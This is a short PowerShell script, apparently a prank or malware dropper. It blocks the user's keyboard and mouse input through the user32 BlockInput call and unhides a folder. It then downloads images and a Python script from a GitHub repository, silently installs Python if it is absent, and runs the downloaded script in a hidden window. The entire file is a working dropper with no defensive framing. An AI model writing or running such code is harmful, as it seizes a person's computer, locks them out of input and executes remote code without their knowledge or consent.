$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@
$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    Start-Sleep $seconds
    $userInput::BlockInput($false)
}
Disable-UserInput -seconds 10 | Out-Null
cd ..
$trycatchfolder = Get-Item ./trycatchthishiddenfolder
$trycatchfolder.Attributes -= "Hidden"
cd .\trycatchthishiddenfolder
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick1.png" -OutFile "Patrick1.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick2.png" -OutFile "Patrick2.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
$p = &{python -V} 2>&1
$version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process "Python-Install.exe" -ArgumentList "/passive InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
